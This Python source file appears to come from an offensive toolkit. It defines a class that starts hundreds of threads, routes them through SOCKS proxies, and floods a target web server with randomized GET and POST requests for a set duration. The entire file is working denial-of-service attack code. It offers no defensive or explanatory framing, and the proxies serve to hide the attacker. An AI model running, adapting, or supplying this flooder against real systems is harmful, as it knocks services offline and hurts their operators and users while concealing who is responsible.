from bane.ddos.utils import *

class Proxies_HTTP_Spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        scraping_timeout=15,
        paths=["/"],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        ssl_on=False,
        logs=True,
    ):
        self.ssl_on=ssl_on
        self.proxies=Proxies_Interface.get_socket_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        self.proxies=[x for x in self.proxies if x['proxy_type'] in ['socks4','socks5','s4','s5']]
        if self.proxies==[]:
            self.proxies=[{'proxy_host':None,'proxy_port':None,'proxy_username':None,'proxy_password':None,'proxy_type':None}]
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        self.method = method
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    proxy=random.choice(self.proxies)
                    s=Proxies_Getter.get_proxy_socket(self.target,self.port,timeout=self.timeout,**proxy)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = "GET"
                        else:
                            req = "POST"
                        m = Socket_Connection.setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            [self.get_user_agent() for x in range(5)],
                        )
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode("utf-8"))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(
                                        proxy['proxy_host'], self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
                            time.sleep(self.interval)
                        except:
                            self.fails+=1
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    self.fails+=1
                time.sleep(0.1)
            self.kill()
        except:
            pass
